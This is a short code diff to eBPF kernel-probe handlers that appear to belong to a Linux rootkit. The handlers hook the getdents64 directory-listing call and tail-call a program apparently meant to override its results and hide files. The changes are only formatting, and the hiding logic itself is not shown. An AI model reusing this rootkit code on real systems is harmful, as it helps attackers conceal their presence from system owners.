@@ -21,17 +21,14 @@ int __x64_sys_getdents64(struct pt_regs *ctx)
     bpf_probe_read(&fd, sizeof(fd), &PT_REGS_PARM1(ctx));
 
     u64 pid_tgid = bpf_get_current_pid_tgid();
-    struct rk_fd_key_t fd_key =
-        {
-            .fd = fd,
-            .pid = pid_tgid >> 32,
-        };
+    struct rk_fd_key_t fd_key = {
+        .fd = fd,
+        .pid = pid_tgid >> 32,
+    };
 
     struct rk_fd_attr_t *fd_attr = (struct rk_fd_attr_t *)bpf_map_lookup_elem(&rk_fd_attrs, &fd_key);
     if (!fd_attr)
-    {
         return 0;
-    }
 
     struct linux_dirent64 *dirent;
     bpf_probe_read(&dirent, sizeof(dirent), &PT_REGS_PARM2(ctx));
@@ -52,9 +49,7 @@ int __x64_sys_getdents64_ret(struct pt_regs *ctx)
     u64 pid_tgid = bpf_get_current_pid_tgid();
     struct rk_getdents_t *getdents = (struct rk_getdents_t *)bpf_map_lookup_elem(&rk_getdents, &pid_tgid);
     if (!getdents)
-    {
         return 0;
-    }
 
     bpf_tail_call(ctx, &rk_progs, OVERRIDE_GET_DENTS_PROG);
 
